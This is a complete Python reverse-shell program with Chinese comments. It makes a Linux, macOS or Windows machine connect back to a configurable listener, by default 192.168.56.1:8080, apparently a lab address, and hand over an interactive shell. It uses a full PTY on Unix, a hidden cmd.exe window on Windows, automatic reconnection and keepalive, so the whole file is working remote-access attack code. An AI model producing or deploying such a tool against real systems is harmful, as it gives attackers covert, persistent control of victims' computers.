#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""反弹交互式 Shell —— Python 实现（Linux / macOS / Windows 受控端）

交互性设计：
  * unix：把 socket 接到 stdio 后走 pty.spawn —— 真 PTY，
    提示符 / Ctrl-C / su / vim 全部正常
  * windows：cmd.exe 管道 + 双线程全双工转发（首行自动 chcp 65001，
    输入 CRLF 归一，输出原始字节转发）
  * 断线自动重连；连接超时 10s；TCP keepalive

用法: reverse.py [HOST] [PORT]
环境: RS_HOST(默认 192.168.56.1) RS_PORT(默认 8080)
      RS_INTERVAL(重连间隔秒，默认 5) RS_SHELL(默认 bash / cmd.exe)
      RS_SESSIONS(最多会话数，0=无限) RS_ONCE=1(等价 1 次会话)
      RS_NO_CHCP=1(windows 不发送 chcp 行)
"""

import os
import socket
import subprocess
import sys
import threading
import time

DEFAULT_HOST = "192.168.56.1"
DEFAULT_PORT = 8080
CONNECT_TIMEOUT = 10


def env_int(name, default):
    raw = os.environ.get(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        return default


def load_config():
    host = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("RS_HOST", DEFAULT_HOST)
    port = env_int("RS_PORT", DEFAULT_PORT)
    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except ValueError:
            pass
    interval = max(1, env_int("RS_INTERVAL", 5))
    shell = os.environ.get("RS_SHELL", "").strip()
    if not shell:
        shell = "cmd.exe" if os.name == "nt" else "/bin/bash"
    sessions = env_int("RS_SESSIONS", 0)
    if os.environ.get("RS_ONCE", "0") == "1":
        sessions = 1
    no_chcp = os.environ.get("RS_NO_CHCP", "0") == "1"
    return host, port, interval, shell, sessions, no_chcp


def enable_keepalive(sock):
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if os.name == "nt" and hasattr(socket, "SIO_KEEPALIVE_VALS"):
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
        else:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)  # type: ignore[attr-defined]
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)  # type: ignore[attr-defined]
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)  # type: ignore[attr-defined]
    except OSError:
        pass


def unix_session(sock, shell):
    """真 PTY：socket -> stdio -> pty.spawn(shell)"""
    import pty  # 延迟导入：Windows 上没有这个模块

    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.environ.setdefault("TERM", "xterm-256color")
    pty.spawn([shell, "-i"])


def windows_session(sock, shell, no_chcp):
    """管道模式：双线程全双工转发，socket 断开时终止子进程"""
    creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    proc = subprocess.Popen(
        shell,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
        creationflags=creationflags,
    )

    def pump_socket_to_child():
        try:
            if not no_chcp:
                proc.stdin.write(b"chcp 65001>nul\r\n")
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                # cmd 管道输入以 LF 分行，统一剥掉 CR
                data = data.replace(b"\r\n", b"\n").replace(b"\r", b"\n")
                proc.stdin.write(data)
        except OSError:
            pass
        finally:
            try:
                proc.kill()
            except OSError:
                pass

    def pump_child_to_socket():
        try:
            while True:
                data = os.read(proc.stdout.fileno(), 4096)
                if not data:
                    break
                sock.sendall(data)
        except OSError:
            pass

    t_in = threading.Thread(target=pump_socket_to_child, daemon=True)
    t_out = threading.Thread(target=pump_child_to_socket, daemon=True)
    t_in.start()
    t_out.start()
    proc.wait()
    t_out.join(timeout=2)


def main():
    host, port, interval, shell, max_sessions, no_chcp = load_config()
    sessions = 0
    while True:
        if max_sessions > 0 and sessions >= max_sessions:
            break
        try:
            sock = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
        except OSError as exc:
            sys.stderr.write(f"[reverse] 连接失败: {exc}\n")
            time.sleep(interval)
            continue
        enable_keepalive(sock)
        sessions += 1
        try:
            if os.name == "nt":
                windows_session(sock, shell, no_chcp)
            else:
                unix_session(sock, shell)
            sys.stderr.write(f"[reverse] 会话结束（已建立 {sessions} 次）\n")
        except OSError as exc:
            sys.stderr.write(f"[reverse] 会话异常: {exc}\n")
        finally:
            try:
                sock.close()
            except OSError:
                pass
        if max_sessions > 0 and sessions >= max_sessions:
            break
        time.sleep(interval)


if __name__ == "__main__":
    main()
